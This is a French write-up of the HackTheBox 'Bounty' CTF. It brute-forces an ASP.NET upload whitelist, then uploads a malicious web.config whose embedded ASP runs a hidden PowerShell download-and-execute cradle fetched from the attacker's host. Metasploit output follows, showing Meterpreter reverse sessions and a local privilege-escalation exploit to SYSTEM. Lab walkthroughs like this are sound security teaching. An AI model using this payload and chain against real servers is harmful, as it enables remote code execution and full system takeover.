# Solution du CTF Bounty de HackTheBox

Introduction
------------

On continue avec une autre machine de [HackTheBox.eu](https://www.hackthebox.eu/), toujours sous Windows.  

Ce CTF a été intéressant et m'a permis de me pencher sur un cas particulier d'exploitation d'un script d'upload. L'escalade de privilège n'a pas montré de réticences particulières comme vous le verrez par la suite.

Obvious vulnerability is obvious
--------------------------------

Un port 80 ouvert, rien d'intéressant sur le site sauf si on fouille avec un directory buster qui nous trouve un script *transfer.aspx* et un répertoire *uploadedfiles* non lisible (403 pour le listing).  

Le formulaire d'upload présent sur *transfer.aspx* semble disposer d'une whitelist d'extensions (un fichier avec l'extension *.nawak* est refusé).  

On se rend assez vite compte que l'équivalent d'un *basename()* pour Windows est appliqué sur le nom d'un fichier ainsi si on modifie la requête d'upload (par exemple avec ZAP) pour donner le nom de fichier *ratata.aspx/toto.png* on se retrouve avec un *toto.png*. Il en va de même avec *ratata.aspx:toto.png*.  

J'ai essayé de jouer avec les *Alternate Data Streams* mais cela ne m'a amené nul part...  

J'ai alors choisit de brute-forcer les extensions de la whitelist, ce qui m'a cette fois dirigé vers le bon chemin (le dictionnaire utilisé est présent sur *Kali Linux*) :  

```python
import sys
from os.path import basename

import requests
from bs4 import BeautifulSoup

filename = sys.argv[1]
fake_filename = sys.argv[2]

failed = set()
succeed = set()
errored = set()

with open("/usr/share/golismero/wordlist/fuzzdb/Discovery/PredictableRes/raft-large-extensions-lowercase.txt", encoding="utf-8", errors="ignore") as fd:
    for line in fd:
        ext = line.strip()

        fake_filename = sys.argv[2] + ext
        print("Using '{}' as filename".format(fake_filename), end=' ')
        data = {"btnUpload": "Upload"}
        files = {
            #"FileUpload1": (basename(filename), open(filename).read(), "image/png")
            "FileUpload1": (fake_filename, open(filename).read(), "image/png")
        }

        sess = requests.session()
        response = sess.get("http://10.10.10.93/transfer.aspx")
        soup = BeautifulSoup(response.text, "html5lib")
        for input_field in soup.find_all("input", attrs={"name": True, "type": "hidden", "value": True}):
            data[input_field["name"]] = input_field["value"]

        response = sess.post(
            "http://10.10.10.93/transfer.aspx",
            data=data,
            files=files,
            headers={"referer": "http://10.10.10.93/transfer.aspx"}
        )

        if "Invalid File. Please try again" in response.text:
            print("Failed!")
            failed.add(ext)

        elif "File uploaded successfully." in response.text:
            print("Success!")
            succeed.add(ext)
        else:
            print(response.text)
            errored.add(ext)

print("succeed", succeed)
print("failed", failed)
print("errored", errored)
```

L'output est le suivant :  

```plain
succeed {'.01.jpg', '.opml.config', '.jpg', '.gif', '.003.l.jpg', '.thumb.jpg', '.001.l.jpg', '.l.jpg', '.png', '.docx', '.doc', '.002.l.jpg', '.003.jpg', '.004.jpg', '.0.jpg', '.config', '.xls', '.004.l.jpg', '.006.l.jpg', '.01-l.jpg', '.doc.doc', '.jpg.jpg', '.xlsx', '.jpeg'}
```

L'extension autorisée qui saute aux yeux est clairement le *.config*. C'est un peu l'équivalent IIS du *.htaccess*. L'extension est notamment mentionnée sur [le guide OWASP pour les failles d'upload de fichier](https://www.owasp.org/index.php/Unrestricted_File_Upload).  

Mais surtout on trouve un article de blog indiquant [qu'il est possible de placer de l'ASP](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/) dans le fichier *.config* et de le faire exécuter. C'est un peu la version Windows de [ce que j'ai pu faire sur le CTF Darknet](http://devloop.users.sourceforge.net/index.php?article160/solution-du-ctf-darknet-de-vulnhub). Rejoice !  

Encore faut-il s'avoir quoi mettre comme instructions ASP... Une recherche rapide permet de s'avoir comment exécuter un programme externe, il suffit alors de coupler ça avec (par exemple) le module web-delivery de Metasploit :  

```plain
msf exploit(multi/script/web_delivery) > exploit
[*] Exploit running as background job 3.

[*] Started reverse TCP handler on 10.10.14.21:139 
[*] Using URL: http://10.10.14.21:80/6ZBEmkVKkU
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -c $o=new-object net.webclient;$o.proxy=[Net.WebRequest]::GetSystemWebProxy();$o.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $o.downloadstring('http://10.10.14.21/6ZBEmkVKkU');
```

Pour les non-initiés ce module permet d'obtenir des one-liners dans différents formats (powershell, python, php, ...) qui une fois exécutés sur la victime permettront d'établir une session Meterpreter (ou un autre payload).  

Notre fichier web.config ressemble alors à celà :  

```html
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set oWSH= Server.CreateObject("WScript.Shell")
oWSH.Run "powershell.exe -nop -w hidden -c $o=new-object net.webclient;$o.proxy=[Net.WebRequest]::GetSystemWebProxy();$o.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $o.downloadstring('http://10.10.14.21/6ZBEmkVKkU');", 1, True
set oWSH = nothing
%>
-->
```

Et une fois uploadé et appelé on obtient notre session Meterpreter :  

```plain
msf exploit(multi/script/web_delivery) > 
[*] 10.10.10.93      web_delivery - Delivering Payload
[*] Sending stage (179779 bytes) to 10.10.10.93
[*] Meterpreter session 1 opened (10.10.14.21:139 -> 10.10.10.93:49159) at 2018-06-30 16:14:20 +0200

msf exploit(multi/script/web_delivery) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > pwd
c:\windows\system32\inetsrv
meterpreter > getuid
Server username: BOUNTY\merlin
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege

meterpreter > sysinfo
Computer        : BOUNTY
OS              : Windows 2008 R2 (Build 7600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

Cet accès nous permet d'accéder au flag utilisateur (e29ad89891462e0b09741e3082f44a2f).  

Comme le système est un x64 et que la session Meterpreter tourne en x86 on va l'*upgrader* à l'aide du module *payload\_inject* qui va ici lancer un notepad.exe et injecter un shellcode x64 pour ouvrir une autre session Meterpreter dans la bonne architecture.  

```plain
msf exploit(windows/local/payload_inject) > show options

Module options (exploit/windows/local/payload_inject):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   NEWPROCESS  false            no        New notepad.exe to inject to
   PID                          no        Process Identifier to inject of process to inject payload.
   SESSION     3                yes       The session to run this module on.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.21      yes       The listen address
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Windows

msf exploit(windows/local/payload_inject) > set NEWPROCESS true
NEWPROCESS => true
msf exploit(windows/local/payload_inject) > exploit

[*] Started reverse TCP handler on 10.10.14.21:4444 
[*] Running module against BOUNTY
[*] Launching notepad.exe...
[*] Preparing 'windows/x64/meterpreter/reverse_tcp' for PID 1988
[*] Sending stage (206403 bytes) to 10.10.10.93
[*] Meterpreter session 4 opened (10.10.14.21:4444 -> 10.10.10.93:49163) at 2018-06-30 16:27:48 +0200
```

./pwnthebox
-----------

On peut difficilement faire plus simple qu'une recherche d'exploits existants pour le système et leur exécution. Ca tombe bien c'est ce qu'il faut faire sur ce CTF :  

```plain
msf post(multi/recon/local_exploit_suggester) > exploit

[*] 10.10.10.93 - Collecting local exploits for x64/windows...
[*] 10.10.10.93 - 15 exploit checks are being tried...
[+] 10.10.10.93 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
[*] Post module execution completed

msf exploit(windows/local/ms10_092_schelevator) > exploit

[*] Started reverse TCP handler on 10.10.14.21:137 
[*] Preparing payload at C:\Windows\TEMP\behaKfkp.exe
[*] Creating task: ncYjGQ5UG1p
[*] SUCCESS: The scheduled task "ncYjGQ5UG1p" has successfully been created.
[*] SCHELEVATOR
[*] Reading the task file contents from C:\Windows\system32\tasks\ncYjGQ5UG1p...
[*] Original CRC32: 0x15b66c52
[*] Final CRC32: 0x15b66c52
[*] Writing our modified content back...
[*] Validating task: ncYjGQ5UG1p
[*] 
[*] Folder: \
[*] TaskName                                 Next Run Time          Status         
[*] ======================================== ====================== ===============
[*] ncYjGQ5UG1p                              7/1/2018 5:30:00 PM    Ready          
[*] SCHELEVATOR
[*] Disabling the task...
[*] SUCCESS: The parameters of scheduled task "ncYjGQ5UG1p" have been changed.
[*] SCHELEVATOR
[*] Enabling the task...
[*] SUCCESS: The parameters of scheduled task "ncYjGQ5UG1p" have been changed.
[*] SCHELEVATOR
[*] Executing the task...
[*] SUCCESS: Attempted to run the scheduled task "ncYjGQ5UG1p".
[*] SCHELEVATOR
[*] Deleting the task...
[*] Sending stage (179779 bytes) to 10.10.10.93
[*] SUCCESS: The scheduled task "ncYjGQ5UG1p" was successfully deleted.
[*] SCHELEVATOR
[*] Meterpreter session 5 opened (10.10.14.21:137 -> 10.10.10.93:49164) at 2018-06-30 16:30:13 +0200

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

On a alors accès au flag root (c837f7b699feef5475a0c079f9d4f5ea)  

Pour les curieux voici le code du script d'upload :  

```plain
using System;
using System.Data;
using System.Configuration;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Web.UI.HtmlControls;

public partial class _Default : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {

    }
    protected void btnUpload_Click(object sender, EventArgs e)
    {
        String path = Server.MapPath("~/UploadedFiles/");
        string[] validFileTypes={"config","gif","png","jpg","jpeg","doc","docx","xls","xlsx"};
        string ext = System.IO.Path.GetExtension(FileUpload1.PostedFile.FileName);
        bool isValidFile = false;
        for (int i = 0; i < validFileTypes.Length; i++)
        {
            if (ext == "." + validFileTypes[i] )
            {
                isValidFile = true;
                break;
            }
        }
        if (!isValidFile)
        {
            Label1.ForeColor = System.Drawing.Color.Red;
            Label1.Text = "Invalid File. Please try again";
        }
        else
        {
            try
            {
                FileUpload1.PostedFile.SaveAs(path
                    + FileUpload1.FileName);
                    Label1.ForeColor = System.Drawing.Color.Green;
                    Label1.Text = "File uploaded successfully.";
            }
            catch (Exception ex)
            {
                Label1.Text = "File could not be uploaded.";
            }

        }
    }
}
```

Finish it
---------

L'exploitation du fichier *.config* était intéressante et méritait le détour. L'escalade de privilèges était pour le moins simple.

*Published October 27 2018 at 17:11*